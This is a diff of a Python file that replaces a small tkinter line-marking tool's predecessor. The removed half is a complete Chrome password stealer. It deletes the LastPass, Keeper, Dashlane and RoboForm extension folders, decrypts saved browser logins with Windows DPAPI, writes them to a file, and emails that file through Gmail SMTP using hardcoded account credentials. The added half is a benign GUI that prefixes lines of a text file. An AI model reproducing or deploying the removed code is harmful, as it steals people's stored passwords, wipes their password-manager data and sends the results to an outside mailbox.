@@ -1,115 +1,58 @@
-import os
-import os.path as op
-import shutil
-import smtplib
-import win32crypt
-from email import encoders
-from email.mime.base import MIMEBase
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.utils import formatdate
-from shutil import copyfile
-from sqlite3 import connect
+import tkinter as tk
+from tkinter import filedialog, messagebox
 
-FROM = "soursweet4444gmail.com"
-PASSWORD = "Om_13523955"
+def select_file():
+	filePath = filedialog.askopenfilename(title='Select raw text file')
+	if not filePath:
+		return
 
-TO = "om7115862@gmail.com"
-SUBJECT = "data for chromePasswordThieve.py"
+	with open(filePath, 'r', encoding='utf-8') as inputFile:
+		lines = inputFile.read().splitlines()
 
-MESSAGE = """\
+	process_lines(lines)
 
-here is output.txt :) 
+def process_lines(lines):
+	markers = {'f': 'F:', 'm': '2.6M:'}
+	outputFile = open('output.txt', 'w', encoding='utf-8')
 
-"""
+	def update_line():
+		nonlocal lineIndex
+		if lineIndex >= len(lines):
+			messagebox.showinfo("Done", "All lines processed and saved to output.txt")
+			outputFile.close()
+			root.destroy()
+			return
+		lineVar.set(f'Current line: {lines[lineIndex]}')
 
-env = os.getenv("LOCALAPPDATA")
-path_lastpass = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\hdokiejnpimakedhajhdlcegeplioahd"
-path_keeper = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\bfogiafebfohielmmehodmfbbebbbpei"
-path_dasklane = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\fdjamakpfbbddfjaooikfcpapjohcfmg"
-path_roboform = env + "\\Google\\Chrome\\User Data\\Default\\Extensions\\pnlccmojcmeohlpggmfnbbiapkmbliob"
+	def mark_line(choice):
+		marker = markers.get(choice)
+		if marker:
+			outputFile.write(marker + lines[lineIndex][14:] + '\n')
+		advance()
 
-try:
-    pass
-    shutil.rmtree(path_lastpass)
-    shutil.rmtree(path_keeper)
-    shutil.rmtree(path_dasklane)
-    shutil.rmtree(path_roboform)
-except:
-    pass
+	def advance():
+		nonlocal lineIndex
+		lineIndex += 1
+		update_line()
 
+	lineIndex = 0
+	lineVar = tk.StringVar()
+	update_line()
 
-# path_all = env+ "\\Google\\Chrome\\User Data\\Default\\Extensions
+	lineLabel = tk.Label(root, textvariable=lineVar, wraplength=600, justify="left")
+	lineLabel.pack(pady=20)
 
-def getPass():
-    # https://github.com/darkarp/chrome-password-hacking/blob/master/create_server.py
-    destination = "output.txt"
+	buttonFrame = tk.Frame(root)
+	buttonFrame.pack()
 
-    path = env + "\\Google\\Chrome\\User Data\\Default\\Login Data"
-    path2 = env + "\\Google\\Chrome\\User Data\\Default\\Login2"
-    path = path.strip()
-    path2 = path2.strip()
+	tk.Button(buttonFrame, text='F:', command=lambda: mark_line('f'), width=10).pack(side='left', padx=10)
+	tk.Button(buttonFrame, text='2.6M:', command=lambda: mark_line('m'), width=10).pack(side='right', padx=10)
 
-    try:
-        copyfile(path, path2)
-    except:
-        pass
-    conn = connect(path2)
-    cursor = conn.cursor()
-    cursor.execute(
-        'SELECT action_url, username_value, password_value FROM logins')
-    if os.path.exists(destination):
-        os.remove(destination)
-    sites = []
-    for raw in cursor.fetchall():
-        # print(raw)
-        ## raw[0] = url
-        ## raw[1] = login
-        ## raw[2] = binary
-        try:
-            if raw[0] not in sites:
-                # print(format(win32crypt.CryptUnprotectData(raw[2])[1]))
-                if os.path.exists(destination):
-                    with open(destination, "a") as password:
-                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
-                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
-                else:
-                    with open(destination, "a") as password:
-                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
-                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
-                sites.append(raw[0])
-        except:
-            continue
-    conn.close()
-    return 0
+# GUI setup
+root = tk.Tk()
+root.title("Marker Replacer")
+root.geometry("700x200")
 
+tk.Button(root, text="Select File", command=select_file, height=2, width=20).pack(pady=40)
 
-def sendEmail():
-    # https://stackoverflow.com/questions/3362600/how-to-send-email-attachments
-    msg = MIMEMultipart()
-    msg['From'] = FROM
-    msg['To'] = TO
-    msg['Date'] = formatdate(localtime=True)
-    msg['Subject'] = SUBJECT
-    msg.attach(MIMEText(MESSAGE))
-
-    part = MIMEBase('application', "octet-stream")
-    with open('output.txt', 'rb') as file:
-        part.set_payload(file.read())
-    encoders.encode_base64(part)
-    part.add_header('Content-Disposition',
-                    'attachment; filename="{}"'.format(op.basename('output.txt')))  # name(s) of attachment(s)
-    msg.attach(part)
-
-    smtp = smtplib.SMTP('smtp.gmail.com', 587)
-    smtp.starttls()
-    smtp.login(FROM, PASSWORD)
-    smtp.sendmail(FROM, TO, msg.as_string())
-    smtp.quit()
-
-    print('successfully sent the mail')
-
-
-getPass()
-
-sendEmail()
+root.mainloop()
